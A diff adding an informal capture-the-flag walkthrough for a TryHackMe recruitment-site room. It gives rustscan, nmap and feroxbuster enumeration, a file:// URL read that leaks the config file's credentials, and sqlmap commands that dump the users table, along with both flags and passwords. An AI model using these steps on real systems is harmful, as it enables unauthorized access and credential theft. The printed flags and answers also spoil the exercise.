@@ -1,0 +1,49 @@
+Attacker_Machine_IP
+Target_Machine_IP
+
+__Note: make sure to replace <target_machine_IP> with the actual Target Machine IP assigned by THM for the room__
+
+http://<target_machine_IP>  would be http://10.10.10.10
+
+#############
+## Q and A ##
+#############
+1. What is the flag value after logging in as a normal user?
+
+Solution:
+  **1. Perfomring a Hybrid scan using rustscan (port scan) and nmap (Service Enumeration, OS / Script Scanning, at Host Discovery)**
+      rustscan -b 500 -a 10.66.161.50 --top -- -sC -sV -Pn
+          🔵 rustscan:  -b 500 -a 10.66.161.50 --top
+          🔵 nmap:  -- -sC -sV -Pn
+
+  **2. Performing a Directory and File Enumeration (directory busting) using feroxbuster and manual exploration**
+      feroxbuster -w https://raw.githubusercontent.com/df-stack/df-stack/main/ffuf/subdomlist.txt -u http://10.66.161.50
+          🔵Discovery with relevance:
+              2.1 http://10.10.10.10/mail (gives the infor of a username: "hr"
+              2.2 http://10.66.161.50/api.php  (no need for feroxbuster, simply click the "Access API" info below the login bar
+                                            (gives the info you can fetch a candidate CV using the following endpoint: /file.php?cv=<URL>
+                                            (this will lead to getting the password for "hr" user)
+              2.3 http://recruit.thm//file.php?cv=file:///var/www/html/config.php (the result of combining info from 2.1 and 2.2)
+             user: hr
+             password: hrpassword123
+                                             1st flag: THM{LOGGED_IN_USER}
+                                                    
+***PRIVILEDGE ESCALATION: Performing further vurnerability search using BurpSuite and SQLMap***
+  **3. Set up BurpSuit: using the terminal, type "burpsuite" + ENTER**
+      3.1 Start a new proxy with "Intercept on" activated
+      3.2 Go to the SQL injection text url to catch this connection: http://10.66.161.50/dashboard.php?search=%27
+      3.3 Go to BurpSuite to view this intercepted connection. Save it as a .txt file in the AttackBox computer. This will allow for SQLmapping (next step)
+                                                                                   
+  **4. Open another terminal for SQLmap commands**
+sqlmap -r recruit.txt -dbs
+sqlmap -r recruit.txt -D recruit_db --tables  
+sqlmap -r recruit.txt -D recruit_db -T users --dump"
+
+             user: admin
+             password: admin@001admin
+                                             2nd flag: THM{LOGGED_IN_ADM1N1}
+
+
+END.
+
+                                                                                   
